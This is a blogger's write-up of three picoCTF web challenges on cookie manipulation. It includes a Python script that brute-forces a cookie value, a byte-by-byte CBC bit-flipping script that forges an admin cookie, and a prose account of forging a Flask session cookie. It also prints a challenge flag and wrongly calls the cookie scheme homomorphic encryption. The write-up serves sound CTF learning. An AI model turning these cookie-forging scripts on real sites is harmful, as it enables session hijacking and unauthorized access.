+++
date = '2026-04-03'
draft = false
title = 'Pico Cookies & More Cookies & Most Cookies writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Cookies

I'm making a writeup for this because I remember having tried to do this one unsuccessfully a while ago.

When first logging in, in the request we can see a `Cookie: name=-1` being set. Modifying it to `name=1` for example doesn't do much, except getting a *That is a cookie! Not very special though...* response.

Setting it to admin just renders the default home page.

There are two POST pages, `/check` and `/search`. The only time I saw `/check` get requested was when my search input was 'chocolate chip'; that's when the cookie was set to `1` by their side. Then I noticed 'snickerdoodle' was setting the Cookie to 0.

I cannot *believe* how long this took me because I kept overthinking it. I finally just iterated through all the numbers using this script:

```python
import requests
from utils.pretty_print import pretty_print

url = "http://wily-courier.picoctf.net:56171/check"

i = 0
while(i<9999):
    headers = {
        "Cookie": f"name={i}"
    }
    res = requests.get(url, headers=headers)
    pretty_print(res) 
    print(f"THE LINE USED WAS {i}")
    i+=1
```

And at `i=18`, we can see the flag:

![challenge-screenshot](flag1.png#center)

## More Cookies

*Welcome to my cookie search page. Only the admin can use it!*

This time, our cookie starts as `name=1`. Now, what's getting modified is the `auth_name` of the cookie, looking something like `TXFkcFFFNzN6OFZpZFpveUhOaWtYcWtkTjZwUHZpUjk0NS9LSnQ5aXkzaXZwUW5PNHk0S2hLTTAyckx6MVZReGd3ejJzVVVYbVJaQytBTEt4M251YWtVQXZ5cHlDeEk2OUNNRlYvTDRoUnJKRlNETXQ5eEt3VVB1SVJMckxZTFA=`. Seems to be some sort of encryption. I tried b64 but just seemed to stay like crap.

After fuzzing, we find a `/flag` and a `/search` page. We *can* send POST requests to `/search`. But doing so, without a `session` token, returns a "danger, unauthenticated search" error. Doing so without an `auth_name` token returns a weird unreadable session token, that also resolves to unauthenticated search.

I ended up searching for a writeup and I'm glad I did, because I wouldn't have guessed this. The writeup I found [here](https://mrshan.medium.com/picoctf-more-cookies-web-exploitation-1238e29e75fe) also cheated, just like me, lol.

Anyways, the technique used was *bit-flipping*. That meant that if there was an `isAdmin=0` parameter inside the cookie, encoded through Homomorphic encryption, by bruteforcingly flipping each byte one by one, we'd switch that 0 to a 1. That's based on [this post right here](https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode/66086#66086).

I wanted to make my own script, though. And I felt like that script was way too complicated for what we're dealing with, so this was *my* version of it:

```python
import requests
from base64 import b64decode, b64encode
from utils.pretty_print import pretty_print

url = "http://wily-courier.picoctf.net:52667"
data = "VmpuUUswUEl5b0xaOFpZek9pbXhoamp6Si9vWDVCcmhNK1ZURzNMSWVrcGxra1R3TjZQcGpQbE5zb3pvYjY2dW9zajFnaUVkTnlJalhaZUxycDJzWndiR0FTWjJIeGN5UGJWelR2ZUY0R3FYKzh1SGFpNzZBM0xLaG16N0JHQzk="
decoded_data = b64decode(b64decode(data).decode())
#turn into byte array
bytes_data = bytearray(decoded_data)

mask = 0b01
for i in range(len(bytes_data)):
    cookie = bytearray(decoded_data)
    cookie[i] ^= mask
    cookie_encoded = b64encode(b64encode(cookie))
    cookie_decoded = cookie_encoded.decode('utf-8')
    
    cookies = {
    "auth_name":cookie_decoded
    }
    
    res = requests.get(url, cookies=cookies)
    if 'picoCTF{' in res.text:
        pretty_print(res)
```

And this worked in about five seconds. 

![challenge-screenshot](flag2.png#center)

## Most Cookies

This time, we're working with flask cookies. There is also a `/display` page, showing "I love blank cookies!" by default. The cookie's data is `{"very_auth":"blank"}`, so we just need to change that.

I googled the commands and I found them very nicely listed [here](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/flask.html).

This is what I ran, and I got the flag upon accessing `/display` with the modified cookie: `picoCTF{cO0ki3s_yum_e45c084f}`.

![challenge-screenshot](flag3.png#center)
